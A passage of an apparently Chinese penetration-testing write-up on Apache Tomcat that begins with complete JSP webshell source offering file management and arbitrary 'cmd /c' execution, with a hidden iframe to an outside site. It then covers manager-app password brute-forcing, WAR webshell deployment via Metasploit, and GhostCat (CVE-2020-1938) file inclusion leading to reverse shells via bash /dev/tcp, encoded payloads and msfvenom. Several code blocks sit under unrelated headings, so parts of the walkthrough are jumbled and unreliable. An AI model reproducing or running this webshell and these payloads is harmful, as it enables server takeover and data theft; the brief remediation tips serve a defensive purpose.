   if (File.separatorChar == '/') return path.replace('\\', File.separatorChar);
   else return path.replace('/', File.separatorChar);
  }
} //End of class HttpMultiPartParser

String formatPath(String p)
{
 StringBuffer sb=new StringBuffer();
 for (int i = 0; i < p.length(); i++) 
 {
  if(p.charAt(i)=='\\')
  {
   sb.append("\\\\");
  }
  else
  {
   sb.append(p.charAt(i));
  }
 }
 return sb.toString();
}

 /**
  * Converts some important chars (int) to the corresponding html string
  */
 static String conv2Html(int i) {
  if (i == '&') return "&";
  else if (i == '<') return "<";
  else if (i == '>') return ">";
  else if (i == '"') return """;
  else return "" + (char) i;
 }

 /**
  * Converts a normal string to a html conform string
  */
 static String htmlEncode(String st) {
  StringBuffer buf = new StringBuffer();
  for (int i = 0; i < st.length(); i++) {
   buf.append(conv2Html(st.charAt(i)));
  }
  return buf.toString();
 }
String getDrivers()
/**
Windows系统上取得可用的所有逻辑盘
*/
{
 StringBuffer sb=new StringBuffer(strDrivers[languageNo] + " : ");
 File roots[]=File.listRoots();
 for(int i=0;i<roots.length;i++)
 {
  sb.append(" <a href=\"javascript:doForm('','"+roots[i]+"\\','','','1','');\">");
  sb.append(roots[i]+"</a> ");
 }
 return sb.toString();
}
static String convertFileSize(long filesize)
{
 //bug 5.09M 显示5.9M
 String strUnit="Bytes";
 String strAfterComma="";
 int intDivisor=1;
 if(filesize>=1024*1024)
 {
  strUnit = "MB";
  intDivisor=1024*1024;
 }
 else if(filesize>=1024)
 {
  strUnit = "KB";
  intDivisor=1024;
 }
 if(intDivisor==1) return filesize + " " + strUnit;
 strAfterComma = "" + 100 * (filesize % intDivisor) / intDivisor ;
 if(strAfterComma=="") strAfterComma=".0";
 return filesize / intDivisor + "." + strAfterComma + " " + strUnit;
}
%>
<%
request.setCharacterEncoding("gb2312");
String tabID = request.getParameter("tabID");
String strDir = request.getParameter("path");
String strAction = request.getParameter("action");
String strFile = request.getParameter("file");
String strPath = strDir + "\\" + strFile; 
String strCmd = request.getParameter("cmd");
StringBuffer sbEdit=new StringBuffer("");
StringBuffer sbDown=new StringBuffer("");
StringBuffer sbCopy=new StringBuffer("");
StringBuffer sbSaveCopy=new StringBuffer("");
StringBuffer sbNewFile=new StringBuffer("");

if((tabID==null) || tabID.equals(""))
{
 tabID = "1";
}

if(strDir==null||strDir.length()<1)
{
 strDir = request.getRealPath("/");
}

if(strAction!=null && strAction.equals("down"))
{
 File f=new File(strPath);
 if(f.length()==0)
 {
  sbDown.append("文件大小为 0 字节，就不用下了吧");
 }
 else
 {
  response.setHeader("content-type","text/html; charset=ISO-8859-1");
  response.setContentType("APPLICATION/OCTET-STREAM"); 
  response.setHeader("Content-Disposition","attachment; filename=\""+f.getName()+"\"");
  FileInputStream fileInputStream =new FileInputStream(f.getAbsolutePath());
  out.clearBuffer();
  int i;
  while ((i=fileInputStream.read()) != -1)
  {
   out.write(i); 
  }
  fileInputStream.close();
  out.close();
 }
}

if(strAction!=null && strAction.equals("del"))
{
 File f=new File(strPath);
 f.delete();
}

if(strAction!=null && strAction.equals("edit"))
{
 File f=new File(strPath); 
 BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(f)));
 sbEdit.append("<form name='frmEdit' action='' method='POST'>\r\n");
 sbEdit.append("<input type=hidden name=action value=save >\r\n");
 sbEdit.append("<input type=hidden ' >\r\n");
 sbEdit.append("<input type=hidden ' >\r\n");
 sbEdit.append("<input type=submit +strFileSave[languageNo]+" '> ");
 sbEdit.append("<input type=button +strBack[languageNo]+" ' onclick='history.back(-1);'>  "+strPath+"\r\n");
 sbEdit.append("<br>
<textarea rows=30 cols=90 );
 String line="";
 while((line=br.readLine())!=null)
 {
  sbEdit.append(htmlEncode(line)+"\r\n");
 }
   sbEdit.append("</textarea>");
 sbEdit.append("<input type=hidden );
 sbEdit.append("</form>");
}

if(strAction!=null && strAction.equals("save"))
{
 File f=new File(strPath);
 BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f)));
 String strContent=request.getParameter("content");
 bw.write(strContent);
 bw.close();
}
if(strAction!=null && strAction.equals("copy"))
{
 File f=new File(strPath);
 sbCopy.append("<br>
<form name='frmCopy' action='' method='POST'>\r\n");
 sbCopy.append("<input type=hidden name=action value=savecopy >\r\n");
 sbCopy.append("<input type=hidden ' >\r\n");
 sbCopy.append("<input type=hidden ' >\r\n");
 sbCopy.append("原始文件："+strPath+"<p>");
 sbCopy.append("目标文件：<input type=text );
 sbCopy.append("<input type=submit +strFileCopy[languageNo]+" '> ");
 sbCopy.append("<input type=button +strBack[languageNo]+" ' onclick='history.back(-1);'> <p> \r\n");
 sbCopy.append("</form>");
}
if(strAction!=null && strAction.equals("savecopy"))
{
 File f=new File(strPath);
 String strDesFile=request.getParameter("file2");
 if(strDesFile==null || strDesFile.equals(""))
 {
  sbSaveCopy.append("<p><font color=red>目标文件错误。</font>");
 }
 else
 {
  File f_des=new File(strDesFile);
  if(f_des.isFile())
  {
   sbSaveCopy.append("<p><font color=red>目标文件已存在,不能复制。</font>");
  }
  else
  {
   String strTmpFile=strDesFile;
   if(f_des.isDirectory())
   {
    if(!strDesFile.endsWith("\\"))
    {
     strDesFile=strDesFile+"\\";
    }
    strTmpFile=strDesFile+"cqq_"+strFile;
    }

   File f_des_copy=new File(strTmpFile);
   FileInputStream in1=new FileInputStream(f);
   FileOutputStream out1=new FileOutputStream(f_des_copy);
   byte[] buffer=new byte[1024];
   int c;
   while((c=in1.read(buffer))!=-1)
   {
    out1.write(buffer,0,c);
   }
   in1.close();
   out1.close();

   sbSaveCopy.append("原始文件 ："+strPath+"<p>");
   sbSaveCopy.append("目标文件 ："+strTmpFile+"<p>");
   sbSaveCopy.append("<font color=red>复制成功！</font>");
  }
 } 
 sbSaveCopy.append("<p><input type=button );
}
if(strAction!=null && strAction.equals("newFile"))
{
 String strF=request.getParameter("fileName");
 String strType1=request.getParameter("btnNewFile");
 String strType2=request.getParameter("btnNewDir");
 String strType="";
 if(strType1==null)
 {
  strType="Dir";
 }
 else if(strType2==null)
 {
  strType="File";
 }
 if(!strType.equals("") && !(strF==null || strF.equals("")))
 {
   File f_new=new File(strF);
   if(strType.equals("File") && !f_new.createNewFile())
    sbNewFile.append(strF+" 文件创建失败");
   if(strType.equals("Dir") && !f_new.mkdirs())
    sbNewFile.append(strF+" 目录创建失败");
 }
 else
 {
  sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>");
 }
}

if((request.getContentType()!= null) && (request.getContentType().toLowerCase().startsWith("multipart")))
{
 String tempdir=".";
 boolean error=false;
 response.setContentType("text/html");
 sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>");
 HttpMultiPartParser parser = new HttpMultiPartParser();

 int bstart = request.getContentType().lastIndexOf("oundary=");
 String bound = request.getContentType().substring(bstart + 8);
 int clength = request.getContentLength();
 Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);
 if (ht.get("cqqUploadFile") != null)
 {

  FileInfo fi = (FileInfo) ht.get("cqqUploadFile");
  File f1 = fi.file;
  UplInfo info = UploadMonitor.getInfo(fi.clientFileName);
  if (info != null && info.aborted) 
  {
   f1.delete();
   request.setAttribute("error", "Upload aborted");
  }
  else 
  {
   String path = (String) ht.get("path");
   if(path!=null && !path.endsWith("\\")) 
    path = path + "\\";
   if (!f1.renameTo(new File(path + f1.getName()))) 
   {
    request.setAttribute("error", "Cannot upload file.");
    error = true;
    f1.delete();
   }
  }
 }
}
%>
<html>
<head>
<style type="text/css">
td,select,input,body{font-size:9pt;}
A { TEXT-DECORATION: none }

#tablist{
padding: 5px 0;
margin-left: 0;
margin-bottom: 0;
margin-top: 0.1em;
font:9pt;
}

#tablist li{
list-style: none;
display: inline;
margin: 0;
}

#tablist li a{
padding: 3px 0.5em;
margin-left: 3px;
border: 1px solid ;
background: F6F6F6;
}

#tablist li a:link, #tablist li a:visited{
color: navy;
}

#tablist li a.current{
background: #EAEAFF;
}

#tabcontentcontainer{
width: 100%;
padding: 5px;
border: 1px solid black;
}

.tabcontent{
display:none;
}

</style>

<script type="text/javascript">

var initialtab=[<%=tabID%>, "menu<%=tabID%>"]

////////Stop editting////////////////

function cascadedstyle(el, cssproperty, csspropertyNS){
if (el.currentStyle)
return el.currentStyle[cssproperty]
else if (window.getComputedStyle){
var elstyle=window.getComputedStyle(el, "")
return elstyle.getPropertyValue(csspropertyNS)
}
}

var previoustab=""

function expandcontent(cid, aobject){
if (document.getElementById){
highlighttab(aobject)
if (previoustab!="")
document.getElementById(previoustab).style.display="none"
document.getElementById(cid).style.display="block"
previoustab=cid
if (aobject.blur)
aobject.blur()
return false
}
else
return true
}

function highlighttab(aobject){
if (typeof tabobjlinks=="undefined")
collecttablinks()
for (i=0; i<tabobjlinks.length; i++)
tabobjlinks[i].style.backgroundColor=initTabcolor
var themecolor=aobject.getAttribute("theme")? aobject.getAttribute("theme") : initTabpostcolor
aobject.style.backgroundColor=document.getElementById("tabcontentcontainer").style.backgroundColor=themecolor
}

function collecttablinks(){
var tabobj=document.getElementById("tablist")
tabobjlinks=tabobj.getElementsByTagName("A")
}

function do_onload(){
collecttablinks()
initTabcolor=cascadedstyle(tabobjlinks[1], "backgroundColor", "background-color")
initTabpostcolor=cascadedstyle(tabobjlinks[0], "backgroundColor", "background-color")
expandcontent(initialtab[1], tabobjlinks[initialtab[0]-1])
}

if (window.addEventListener)
window.addEventListener("load", do_onload, false)
else if (window.attachEvent)
window.attachEvent("onload", do_onload)
else if (document.getElementById)
window.onload=do_onload



</script>
<script language="javascript">

function doForm(action,path,file,cmd,tab,content)
{
 document.frmCqq.action.value=action;
 document.frmCqq.path.value=path;
 document.frmCqq.file.value=file;
 document.frmCqq.cmd.value=cmd;
 document.frmCqq.tabID.value=tab;
 document.frmCqq.content.value=content;
 if(action=="del")
 {
  if(confirm("确定要删除文件 "+file+" 吗？"))
  document.frmCqq.submit();
 }
 else
 {
  document.frmCqq.submit();
 }
}
</script>

<title>JSP Shell 岁月联盟专用版本</title>
<head>

<body>

<form >
<input type="hidden" >
<input type="hidden" >
<input type="hidden" >
<input type="hidden" >
<input type="hidden" >
<input type="hidden" >
</form>

<!--Top Menu Started-->
<ul id="tablist">
<li><a href="" class="current" onClick="return expandcontent('menu1', this)"> <%=strFileManage[languageNo]%> </a></li>
<li><a href="new.htm" onClick="return expandcontent('menu2', this)" theme="#EAEAFF"> <%=strCommand[languageNo]%> </a></li>
<li><a href="hot.htm" onClick="return expandcontent('menu3', this)" theme="#EAEAFF"> <%=strSysProperty[languageNo]%> </a></li>
<li><a href="search.htm" onClick="return expandcontent('menu4', this)" theme="#EAEAFF"> <%=strHelp[languageNo]%> </a></li>
   <%=authorInfo[languageNo]%>
</ul>
<!--Top Menu End-->

<%
StringBuffer sbFolder=new StringBuffer("");
StringBuffer sbFile=new StringBuffer("");
try
{
 File objFile = new File(strDir);
 File list[] = objFile.listFiles(); 
 if(objFile.getAbsolutePath().length()>3)
 {
  sbFolder.append("<tr><td > </td><td><a href=\"javascript:doForm('','"+formatPath(objFile.getParentFile().getAbsolutePath())+"','','"+strCmd+"','1','');\">");
  sbFolder.append(strParentFolder[languageNo]+"</a><br>
- - - - - - - - - - - </td></tr>\r\n ");

 }
 for(int i=0;i<list.length;i++)
 {
  if(list[i].isDirectory())
  {
   sbFolder.append("<tr><td > </td><td>");
   sbFolder.append("  <a href=\"javascript:doForm('','"+formatPath(list[i].getAbsolutePath())+"','','"+strCmd+"','1','');\">");
   sbFolder.append(list[i].getName()+"</a><br>
</td></tr> ");
  }
  else
  {
      String strLen="";
   String strDT="";
   long lFile=0;
   lFile=list[i].length();
   strLen = convertFileSize(lFile);
   Date dt=new Date(list[i].lastModified());
   strDT=dt.toLocaleString();
   sbFile.append("<tr onmouseover=\"this.style.backgroundColor='#FBFFC6'\" onmouseout=\"this.style.backgroundColor='white'\"><td>");
   sbFile.append(""+list[i].getName()); 
   sbFile.append("</td><td>");
   sbFile.append(""+strLen);
   sbFile.append("</td><td>");
   sbFile.append(""+strDT);
   sbFile.append("</td><td>");

   sbFile.append("  <a href=\"javascript:doForm('edit','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
   sbFile.append(strFileEdit[languageNo]+"</a> ");

   sbFile.append("  <a href=\"javascript:doForm('del','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
   sbFile.append(strFileDel[languageNo]+"</a> ");

   sbFile.append("   <a href=\"javascript:doForm('down','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
   sbFile.append(strFileDown[languageNo]+"</a> ");

   sbFile.append("   <a href=\"javascript:doForm('copy','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
   sbFile.append(strFileCopy[languageNo]+"</a> ");
  }

 } 
}
catch(Exception e)
{
 out.println("<font color=red>操作失败："+e.toString()+"</font>");
}
%>

<DIV id="tabcontentcontainer">

<div id="menu3" class="tabcontent">
<br>

<br>
    未完成
<br>

<br>


</div>

<div id="menu4" class="tabcontent">
<br>

<p>一、功能说明</p>
<p>    jsp 版本的文件管理器，通过该程序可以远程管理服务器上的文件系统，您可以新建、修改、</p>
<p>删除、下载文件和目录。对于windows系统，还提供了命令行窗口的功能，可以运行一些程序，类似</p>
<p>与windows的cmd。</p>
<p> </p>
<p>二、测试</p>
<p>   <b>请大家在使用过程中，有任何问题，意见或者建议都可以给我留言，以便使这个程序更加完善和稳定，<p>
留言地址为：<a href="http://" target="_blank"></a></b>
<p> </p>
<p>三、更新记录</p>
<p>    2004.11.15  V0.9测试版发布，增加了一些基本的功能，文件编辑、复制、删除、下载、上传以及新建文件目录功能</p>
<p>    2004.10.27  暂时定为0.6版吧， 提供了目录文件浏览功能 和 cmd功能</p>
<p>    2004.09.20  第一个jsp 程序就是这个简单的显示目录文件的小程序</p>
<p> </p>
<p> </p>
</div>

<div id="menu1" class="tabcontent">
<%
out.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF><tr><td width='30%'>"+strCurrentFolder[languageNo]+"：<b>"+strDir+"</b></td><td>" + getDrivers() + "</td></tr></table><br>
\r\n");
%>
<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">

        <tr> 
          <td width="25%" align="center" valign="top"> 
              <table width="98%" border="0" cellspacing="0" cellpadding="3">
     <%=sbFolder%>
                </tr>
              </table>
          </td>
          <td width="81%" align="left" valign="top">

 <%
 if(strAction!=null && strAction.equals("edit"))
{
  out.println(sbEdit.toString());
 }
 else if(strAction!=null && strAction.equals("copy"))
 {
  out.println(sbCopy.toString());
 }
 else if(strAction!=null && strAction.equals("down"))
 {
  out.println(sbDown.toString());
 }
 else if(strAction!=null && strAction.equals("savecopy"))
 {
  out.println(sbSaveCopy.toString());
 }
 else if(strAction!=null && strAction.equals("newFile") && !sbNewFile.toString().equals(""))
 {
  out.println(sbNewFile.toString());
 }
 else
 {
 %>
  <span id="EditBox"><table width="98%" border="1" cellspacing="1" cellpadding="4" bordercolorlight="#cccccc" bordercolordark="#FFFFFF" bgcolor="white" >
              <tr bgcolor="#E7e7e6"> 
                <td width="26%"><%=strFileName[languageNo]%></td>
                <td width="19%"><%=strFileSize[languageNo]%></td>
                <td width="29%"><%=strLastModified[languageNo]%></td>
                <td width="26%"><%=strFileOperation[languageNo]%></td>
              </tr>
            <%=sbFile%>
             <!-- <tr align="center"> 
                <td colspan="4"><br>

                  总计文件个数：<font color="#FF0000">30</font> ，大小：<font color="#FF0000">664.9</font> 
                  KB </td>
              </tr>
    -->
            </table>
   </span>
 <%
 }
 %>

          </td>
        </tr>

 <form >
 <tr><td colspan=2 bgcolor=#FBFFC6>
 <input type="hidden" >
 <input type="hidden" >
 <input type="hidden" >
 <input type="hidden" >
 <input type="hidden" >
 <input type="hidden" >
 <%
 if(!strDir.endsWith("\\"))
 strDir = strDir + "\\";
 %>
 <input type="text" >
 <input type="submit"  > 
 <input type="submit"  > 
 </form>
 <form >
 <input type="hidden" >
 <input type="hidden" >
 <input type="hidden" >
 <input type="hidden" >
 <input type="hidden" >
 <input type="hidden" >
 <input type="file" >
 <input type="submit" >
 </td></tr></form>
      </table>
</div>
<div id="menu2" class="tabcontent">

<%
String line="";
StringBuffer sbCmd=new StringBuffer("");

if(strCmd!=null) 
{
 try
 {
  //out.println(strCmd);
  Process p=Runtime.getRuntime().exec("cmd /c "+strCmd);
  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
  while((line=br.readLine())!=null)
  {
   sbCmd.append(line+"\r\n");
  }
 }
 catch(Exception e)
 {
  System.out.println(e.toString());
 }
}
else
{
 strCmd = "set";
}

%>
<form >

<input type="text"  size=50>
<input type="hidden" >
<input type=submit <%=strExecute[languageNo]%>">
</form>
<%
if(sbCmd!=null && sbCmd.toString().trim().equals("")==false)
{
%>
 <TEXTAREA ><%=sbCmd.toString()%></TEXTAREA>
<br>

<%
}
%>
</DIV>
</div>
<br>
<br>

<center><a href="http://" target="_blank"></a> 
<br>

<iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe>

```

登录进去之后 进行查看

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaswDsn0Op6COgRmy4uq4dJyU2vMxGNGicXYtOCThT2OILsboy0D1HzQw/640?wx_fmt=jpeg)

**为什么需要上传 wa 包，为什么不是 tar.zip？？**

war 包是用来进行 Web 开发时一个网站项目下的所有代码，包括前台 HTML/CSS/JS 代码，以及后台 JavaWeb 的代码。当开发人员开发完毕时，就会将源码打包给测试人员测试，测试完后若要发布则也会打包成 War 包进行发布。War 包可以放在 Tomcat 下的 webapps 或 word 目录，当 Tomcat 服务器启动时，War 包即会随之解压源代码来进行自动部署。

上传 JSP 的大马

```
use exploit/multi/http/tomcat_mgr_upload 
set HttpUsername tomcat
set HttpPassword tomcat
set rhosts 192.168.175.191
set rport 8080
exploit

```

zip 压缩 然后改后缀 成 war 的包

或者使用 Java 命令：

```
Authorization: Basic dG9tY2F0OnRvbWNhdA==

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaKKKOOXicHLOC3OwpPNPViaWLFnzz5LplzrzCIgfnlRDkvqsah4edhxYA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa8n1SWNLic4H24pPoicV7SSl4sdKsibLDnQfhSic2iby7rx7jict9kSY1mnUw/640?wx_fmt=jpeg)

这里的`/2`就是 war 包的名字

去 docker 底层看看是否成功上传

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QarJOmZmb8pfxdEicmQ6BZldWLweMNZw1M43NicmCib50L2XugXvjr3hWUg/640?wx_fmt=jpeg)

它会自动部署 那我们访问一下

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QayJA3eeiba9J5JIibGFzFCWDV8oTExJ9LuW7B126YBX01m9YlH3GxOLrg/640?wx_fmt=jpeg)

成功解析 jsp 大马，并能 upload 上传功能！

这里上传冰蝎的 jsp 马儿

```
Apache Tomcat 9.x < 9.0.31
Apache Tomcat 8.x<8.5.51
Apache Tomcat 7.x<7.0.100
Apache tomcat 6.x

```

```
cd tomcat/CVE-2020-1938

sudo docker-compose up -d

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaTGjguWNv1XVNUwKbCW8g6NqlhoJtxXvOgI7X33WmBTqqsFGN6WTickg/640?wx_fmt=jpeg)

upload 之后 上冰蝎进行连接

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaPETeiaZcnyC0fzaFQw4CGkUj1hILQWwJDstSeSicpfiaw1tM0F1qvmtKg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaibfDjlo0bvXjXWwEpzSUbibxG1CNykjHMNaShcDd9mqP1jUgGE8Fod5A/640?wx_fmt=jpeg)

再贴一个 JSP 大马

```
python2 文件读取.py 192.168.175.191 -p 8009 -f webapps目录下的待读取的文件

```

#### MSF 攻击

```
python2 文件读取.py 192.168.175.191 -p 8009 -f /WEB-INF/web.xml

```

这里就直接略过了 自己去操作一下

这就成功进来了

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaPejib59ubbRpGUN8xyKc7hRiblgPdrzueLWA423zdThkQiaE3mfUcLnYg/640?wx_fmt=jpeg)

#### 修复建议

1、在系统上以低权限运行 Tomcat 应用程序。创建一个专门的 Tomcat 服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）

2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。  
在 CATALINA_HOME/conf/web.xml 文件设置锁定机制和时间超时限制  
3、以及针对 manager-gui/manager-status/manager-script 等目录页面设置最小权限访问限制

### Tomcat manager App 暴力破解

#### 漏洞复现

我们先抓后台的包

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaOqxsGm5MRj8M8icTsFcSf5K3g7GBFRAwEtpXTPZYW0ibx7OMdPh4I89g/640?wx_fmt=jpeg)

然后放包 进行登录

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qanric5dQFRibJKy927rxm2ibDD53zoeGnia8iavLDBzgXVp7xj0el4xfibXsQ/640?wx_fmt=jpeg)

这里注意这段回显

```
bash -i >& /dev/tcp/192.168.175.191/8888 0>&1

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaMvp6O5ult0DbVSjY0UsT1AWF67na6q848vHYHjhHlqW2IgIJRSwIjQ/640?wx_fmt=jpeg)

发现 Tomcat 的后台登录账号和密码

是以 base64 加密的 账号: 密码

然后我们重新去抓后台的包 进行爆破

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaqialeStzgCQQVa02XVT4NUCJjhH3q9kNbiakMOuJzVm6ON9zZ94ALbxg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaicMbvf74iaRhts83cDwrrJochiaa8Lia5myKwGwKlwBrOmeeqI9ak3CoMg/640?wx_fmt=jpeg)

添加密码本 和 base64 的编码规则

把这个自带的编码 对勾去掉

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaKO78yL0LtTic5iabsZhdq91p93ibtpCjl9cxayPGwXXc27lemEd1BLHCw/640?wx_fmt=jpeg)

开始攻击 拿到账号和密码

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QakhGibMbrkU1xKUYww4tZEYicDmtBO5VLAG8RVSMglYWg7bAaX8ZCzR7A/640?wx_fmt=jpeg)

这里讲第二种方式

自定义迭代器

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaonCWMBSYMvoWQetGreiaWSdtYnGlQcpuI1kBKLb1cVnO18CPpNk8gZg/640?wx_fmt=jpeg)

分位置 进行不同的载入

比如这里 就应该是 3 个位置

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa2Z6v3XjkKtrLe4gHRj99tuujvL5VIcbptqsG6XRF5rWzB7ibpJibO0zQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qas2G5j1woLuaF7v5INJjQNtnVoCVa4Ria9yfQzFl6xcyKX1RvkJVP2AQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QapiawU5dEOg7m48dEe7KEjZ7Jc4maCicGAtPtFUVJrp3csicw6AH019nfQ/640?wx_fmt=jpeg)

下面和之前的设置 一样

base64 编码 和去掉对勾 默认的 Url 编码

#### 修复建议

1. 取消 manager/html 功能  
2.manager 页面应只允许本地 IP 访问

### Tomcat AJP 文件包含漏洞分析 (CVE-2020-1938)

#### 漏洞简介

由于 Tomcat 在处理`AJP`请求时，未对请求做任何验证

通过设置 AJP 连接器封装的 request 对象的属性，导致产生任意文件读取漏洞和代码执行漏洞！  
CVE-2020-1938 又名 GhostCat，由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源码。

此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。

#### 源码分析

漏洞成因是两个配置文件导致

Tomat 在部罢时有两个重要的配置文件`conf/server.xml、conf/web.xml`

前者定义了 Tomcat 启动时涉及的组件属性，其中包含两个 connector(用于处理请求的组件)

如果开启状态下，tomcat 启动后会监听 8080、8009 端口，它们分别负责接受 http、ajp 协议的数据

后者则和普通的 javaWeb 应用一样，用来定义 servlet

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}

```

#### 参考链接

https://xz.aliyun.com/t/7325

https://yinwc.github.io/2020/03/01/CVE-2020-1938/

#### 运行过程

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa6wl8nUiaF1oOW956aoKiaRH0591KdRicQs1x7I5zWicibAESaB4JYCViaY0A/640?wx_fmt=jpeg)

从图中可以看出，Tomcat 最顶层的容器是 Server，其中包含至少一个或者多个 Service，一个 Service 有多个 Connector 和一个 Container 组成。

这两个组件的作用为:

1、Connector 用于处理连接相关的事情，并提供 Socket 与 Request 和 Response 相关的转化；  
2、Container 用于封装和管理 Servlet，以及具体处理 Request 请求

Tomcat 默认的`conf/server.xml`中配置了 2 个 Connector，

一个为 8080 端口 HTTP 协议 (1.1 版本) 端口，默认监听地址：`0.0.0.0:8080`

另外一个就是默认的 8009 AJP 协议 (1.3 版本)，默认监听地址为：`0.0.0.0:8009`，两个端口默认均监听在外网。此次漏洞产生的位置便是 8009 AJP 协议，此处使用公开的利用脚本进行测试，可以看到能读取`web.xml`文件

#### 漏洞复现

利用 vulhub

```
<%
    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}").getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("</pre>");
%>

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaAyTHnayPystIPazTG4MLLasEsOuLD06NXRJZkcQJV8YbEEh26nmmyg/640?wx_fmt=jpeg)

Poc 地址：

https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi

脚本是基于 Python2 的

它可以看 webapps 目录下的所有东西

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaibuPJy3zkIjCPPMZ2hI0I3TNhBu5dnqhvK4wMqywvy8spcTBgbGBicAg/640?wx_fmt=jpeg)

可以看到它的语法要求

```
sudo docker ps

```

```
sudo docker cp /home/dayu/Desktop/1.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qah9reEYUjGwNGmhroVHiaATAoavJHsz6RoYCMXiamJdpwIPg104W1pcxg/640?wx_fmt=jpeg)

文件包含 RCE

在线 bash payload 生成：http://www.jackson-t.ca/runtime-exec-payloads.html

```
sudo docker exec -ti 6c bash

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qae0D5LOoQFw0etYJ5ITtcmN5kPq2ic0rV89CITk9kSUdCb3jNibMnfnKg/640?wx_fmt=jpeg)

```
python2 文件包含.py 192.168.175.191 -p 8009 -f 1.txt

```

最终的 txt 的 payload

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.175.167 LPORT=4444 R > shell.txt

```

这边要手动上传上去

查看

```
sudo docker cp /home/dayu/Desktop/shell.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QajRiaN8gIWLAiaLwMWEEkzlyjSOKCyMLC6hOcTcXU2wgkfgSibfXxZb1Yg/640?wx_fmt=jpeg)

然后开始上传

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.175.167
lhost => 192.168.175.167
